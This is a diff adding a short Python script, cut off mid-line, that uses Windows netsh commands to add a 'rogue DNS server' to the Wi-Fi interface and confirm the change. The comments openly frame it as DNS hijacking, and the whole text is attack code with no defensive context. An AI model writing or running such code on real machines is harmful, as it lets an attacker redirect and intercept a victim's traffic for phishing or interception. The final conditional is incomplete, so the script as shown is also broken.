@@ -1,0 +1,14 @@
+import subprocess
+
+# Replace with the IP address of the rogue DNS server
+rogue_dns_server = "10.0.0.1"
+
+# Get the current DNS server settings
+current_dns_servers = subprocess.check_output(["netsh", "interface", "ip", "show", "dnsservers"])
+
+# Modify the DNS server settings to point to the rogue DNS server
+subprocess.call(["netsh", "interface", "ip", "add", "dnsservers", "Wi-Fi", rogue_dns_server])
+
+# Confirm that the DNS server settings have been changed
+new_dns_servers = subprocess.check_output(["netsh", "interface", "ip", "show", "dnsservers"])
+if new_dns_servers
